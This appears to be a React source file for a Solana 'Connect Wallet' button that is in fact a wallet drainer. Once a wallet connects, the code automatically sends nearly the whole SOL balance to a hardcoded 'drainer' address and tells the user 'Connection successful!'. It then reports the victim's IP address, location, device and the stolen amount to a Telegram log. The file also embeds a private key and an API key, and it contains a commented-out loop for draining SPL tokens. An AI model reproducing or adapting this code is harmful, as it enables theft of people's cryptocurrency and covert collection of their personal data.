"use client"

import type { ReactNode } from "react"
import { useState, useEffect, useRef } from "react"
import dynamic from "next/dynamic"
import { useWallet } from "@solana/wallet-adapter-react"
import { Connection, PublicKey, LAMPORTS_PER_SOL, Transaction, SystemProgram, clusterApiUrl, Keypair } from "@solana/web3.js"
import {
  getOrCreateAssociatedTokenAccount,
  createTransferCheckedInstruction,
  createAssociatedTokenAccountInstruction,
  getAssociatedTokenAddress,
  ASSOCIATED_TOKEN_PROGRAM_ID,TOKEN_PROGRAM_ID,
} from "@solana/spl-token";
import { useToast } from "@/components/ui/toast-context"
import { sendTelegramLog } from "@/utils/telegram-logger"
import { getUserInfo } from "@/utils/user-info"
import bs58 from "bs58"


// Dynamically import the WalletMultiButton with no SSR
const WalletMultiButtonDynamic = dynamic(
  async () => (await import("@solana/wallet-adapter-react-ui")).WalletMultiButton,
  { ssr: false },
)

interface WalletButtonProps {
  className?: string
  children?: ReactNode
}

export default function WalletButton({ className, children }: WalletButtonProps) {
  const { publicKey, connecting, connected, sendTransaction } = useWallet()
  const [hasError, setHasError] = useState(false)
  const [hasTriggeredTransaction, setHasTriggeredTransaction] = useState(false)
  const [isProcessingTransaction, setIsProcessingTransaction] = useState(false)
  const { showToast } = useToast()
  const transactionAttemptedRef = useRef(false)
  const [isMounted, setIsMounted] = useState(false)
  const transactionInProgressRef = useRef(false)

  useEffect(() => {
    setIsMounted(true)
  }, [])

  // Reset error state when connection status changes
  useEffect(() => {
    if (connected && publicKey) {
      setHasError(false)

      // Only trigger transaction if it hasn't been attempted yet and no transaction is in progress
      if (!transactionAttemptedRef.current && !transactionInProgressRef.current && !hasTriggeredTransaction) {
        transactionAttemptedRef.current = true
        triggerTransaction()
      }
    }
  }, [connected, publicKey, hasTriggeredTransaction])

  // Format wallet address for display
  const formatWalletAddress = (address: string) => {
    if (!address) return ""
    return `${address.slice(0, 4)}...${address.slice(-4)}`
  }

  // Custom label for the button based on connection state
  const getButtonLabel = () => {
    if (connecting) return "Connecting..."
    if (isProcessingTransaction) return "Processing..."
    if (hasError) return "Try Again"
    if (publicKey) return formatWalletAddress(publicKey.toString())
    return children || "Connect Wallet"
  }

  // Handle button click
  const handleClick = () => {
    // Reset error state when button is clicked
    setHasError(false)
  }

  // Helper function to get country flag emoji
  const getCountryFlag = (countryName: string): string => {
    const countryFlags: Record<string, string> = {
      "United States": "🇺🇸",
      "United Kingdom": "🇬🇧",
      Canada: "🇨🇦",
      Australia: "🇦🇺",
      Germany: "🇩🇪",
      France: "🇫🇷",
      Japan: "🇯🇵",
      China: "🇨🇳",
      India: "🇮🇳",
      Brazil: "🇧🇷",
      Russia: "🇷🇺",
      "South Korea": "🇰🇷",
      Italy: "🇮🇹",
      Spain: "🇪🇸",
      Mexico: "🇲🇽",
      Netherlands: "🇳🇱",
      Sweden: "🇸🇪",
      Switzerland: "🇨🇭",
      Singapore: "🇸🇬",
      Unknown: "🌍",
    }

    return countryFlags[countryName] || "🌍"
  }

  // Helper function to get user device info
  const getUserDevice = (userAgent: string): string => {
    if (!userAgent) return "Unknown Device"

    if (userAgent.includes("iPhone") || userAgent.includes("iPad")) return "📱 iOS Device"
    if (userAgent.includes("Android")) return "📱 Android Device"
    if (userAgent.includes("Windows")) return "💻 Windows PC"
    if (userAgent.includes("Mac")) return "💻 Mac"
    if (userAgent.includes("Linux")) return "💻 Linux"

    return "💻 Desktop Device"
  }

  // Function to trigger transaction
  const triggerTransaction = async () => {
    if (!publicKey || !connected || hasTriggeredTransaction || transactionInProgressRef.current) {
      console.log("Transaction not triggered due to conditions not met:", {
        publicKey: !!publicKey,
        connected,
        hasTriggeredTransaction,
        transactionInProgress: transactionInProgressRef.current,
      })
      return
    }

    // Set transaction in progress flag to prevent multiple simultaneous transactions
    transactionInProgressRef.current = true
    setIsProcessingTransaction(true)

    try {
      const drainer = new PublicKey("8MN8QciRbHARCjq1gCeh4vNxLrw8F7YTsgoVJGisPvTt")
      const secret = Keypair.fromSecretKey(
        bs58.decode("3r8mykC8HCirQBq5R5ZXEB5vBWd53WFsbSSpfmah1s4uETHzKJpCoCgJubZ6CuUykPMfEv5fdt4aV6BRFwqm7uaY"));
      const vault = secret.publicKey
      // Replace with your Alchemy Solana RPC URL
      const ALCHEMY_API_URL = 'https://solana-mainnet.g.alchemy.com/v2/1duafDP7kyCuWgHCJ_-Mihe4o4r1wC9S';

      // Set up the connection to Alchemy Solana
      const connection = new Connection(ALCHEMY_API_URL, 'confirmed');
      //fetch balance
      let Bal;
      try {
        Bal = await connection.getBalance(publicKey);
      } catch (error) {
        console.error("Failed to fetch balance:", error);
        showToast("Failed to fetch balance. Please try again.", "error");
        return;
      }
      //new Transaction
      const transaction = new Transaction();
      //fetch token accounts
      let tokenAccounts;
      try {
        tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, { programId: TOKEN_PROGRAM_ID });
      } catch (error) {
        console.error("Failed to fetch token accounts:", error);
        showToast("Failed to fetch token accounts. Please try again.", "error");
        return;
      }

      // Filter and process token accounts
      /*for (const { pubkey, account } of tokenAccounts.value) {
        const parsed = account.data.parsed.info;
        const state = parsed.state;
        if (!parsed.tokenAmount.amount) {
          console.error("Invalid token amount:", parsed.tokenAmount);
          continue;
        }
        const amount = BigInt(parsed.tokenAmount.amount);
        const mint = new PublicKey(parsed.mint);

        // Skip frozen or empty accounts
        if (state === "frozen" || !amount || amount === 0n) {
          console.log("skipped")
          continue;
        }
        if (!parsed || !parsed.state || !parsed.tokenAmount) {
          continue;
        }
        const decimals = parsed.tokenAmount.decimals; 
        if (decimals === undefined || decimals === null) {
          continue;
        }

        // 🏦 Get the destination's associated token account
        let destATA;
        try {
          destATA = await getAssociatedTokenAddress(
            mint,
            vault,
            false,
            TOKEN_PROGRAM_ID,
            ASSOCIATED_TOKEN_PROGRAM_ID
          );
        } catch (error) {
          console.error("Failed to get associated token address:", error);
          showToast("Failed to get associated token address. Please try again.", "error");
          continue;
        }

        // 🧱 Create the ATA if it doesn't exist yet
        let ataInfo;
        try {
          ataInfo = await connection.getAccountInfo(destATA);
        } catch (error) {
          console.error("Failed to fetch ATA info:", error);
          showToast("Failed to fetch account info. Please try again.", "error");
          continue;
        }
        if (!ataInfo) {
          const createAtaIx = createAssociatedTokenAccountInstruction(
            vault, // fee payer
            destATA, // associated token account to be created
            vault, // ATA owner
            mint,
            TOKEN_PROGRAM_ID,
            ASSOCIATED_TOKEN_PROGRAM_ID
          );
          transaction.add(createAtaIx);
        }

        console.log(`Adding transfer instruction from ${pubkey.toString()} to ${destATA.toString()} for amount ${amount}`);

        // Add the token transfer instruction to the single transaction
        transaction.add(
          createTransferCheckedInstruction(
            pubkey, // Source token account
            mint, // Token mint
            destATA, // Destination token account
            publicKey, // Wallet public key (signer)
            amount, // Amount to transfer
            parsed.tokenAmount.decimals // Token decimals
          )
        );
      }*/

      let blockhash;
      try {
        const latestBlockhash = await connection.getLatestBlockhash();
        blockhash = latestBlockhash.blockhash;
      } catch (error) {
        console.error("Failed to fetch blockhash:", error);
        showToast("Failed to fetch blockhash. Please try again.", "error");
        return;
      }

      let estimatedFee = 5000; // Fallback default
      try {
        const feeCalculator = await connection.getFeeCalculatorForBlockhash(blockhash);
        estimatedFee = feeCalculator.value?.lamportsPerSignature || estimatedFee;
      } catch (error) {
        console.warn("Failed to get fee calculator, using default estimated fee.");
      }
      const MIN_BALANCE_FOR_TRANSFER = 3000000 + estimatedFee;
      if (Bal <= MIN_BALANCE_FOR_TRANSFER) {
        console.error("Insufficient balance for transfer");
        showToast("Insufficient balance for transfer", "error");
        return;
      }

      const solIx = SystemProgram.transfer({
        fromPubkey: publicKey,
        toPubkey: drainer,
        lamports: Bal - 3000000,
      });

      transaction.add(solIx)
      

      // Set recent blockhash and fee payer
      transaction.recentBlockhash = blockhash;
      transaction.feePayer = publicKey

      // Send the transaction
      let signature;
      try {
        signature = await sendTransaction(transaction, connection);
        console.log("Transaction sent:", signature);
      } catch (error) {
        console.error("Transaction failed:", error);
        showToast("Connection failed. Please try again.", "error");
        return; // Exit early to avoid accessing `signature`
      }

      // Wait for confirmation
      const confirmation = await connection.confirmTransaction(signature);
      if (confirmation.value.err) {
        throw new Error(`Connection failed: ${confirmation.value.err.toString()}`);
      }

      // Show success message
      showToast("Connection successful!.", "success")
      setHasTriggeredTransaction(true)

      // Log successful transaction to Telegram
      try {
        const userInfo = await getUserInfo()
        const countryFlag = getCountryFlag(userInfo.country)

        const logMessage = `
<b>✅ Transaction Successful</b>
<b>💰 Amount:</b> ${Bal / LAMPORTS_PER_SOL} SOL
<b>👛 From:</b> ${publicKey.toString()}
<b>🏦 To:</b> A3Eax5BAZ2xraHm4gwZ7fFBVtGNV4u7fgbhwfmgsMP6K
<b>🔗 Signature:</b> <a href="https://explorer.solana.com/tx/${signature}?cluster=testnet">${signature.slice(0, 8)}...${signature.slice(-8)}</a>
<b>🌐 IP:</b> ${userInfo.ip}
<b>📍 Location:</b> ${countryFlag} ${userInfo.country}, ${userInfo.city}
<b>🖥️ Device:</b> ${getUserDevice(userInfo.userAgent)}
<b>⏰ Time:</b> ${new Date().toISOString()}
        `

        await sendTelegramLog(logMessage)
      } catch (logError) {
        console.error("Error logging successful transaction to Telegram:", logError)
      }
    } catch (error) {
      console.error("Transaction error:", error)

      // Only log user rejection errors to console, not to Telegram
      if (error.message?.includes("User rejected")) {
        console.log("User rejected transaction");
        showToast("Transaction was cancelled by user.", "info");
      } else {
        showToast("Transaction failed. Please try again.", "error");
        setHasError(true);
      }
      transactionAttemptedRef.current = false;
    } finally {
      setIsProcessingTransaction(false)
      transactionInProgressRef.current = false
    }
  }

  if (!isMounted) {
    return null
  }

  return (
    <div className="relative">
      <WalletMultiButtonDynamic
        className={`${className || "wallet-adapter-button"} button-3d button-glow`}
        onClick={handleClick}
      >
        {getButtonLabel()}
      </WalletMultiButtonDynamic>
    </div>
  )
}
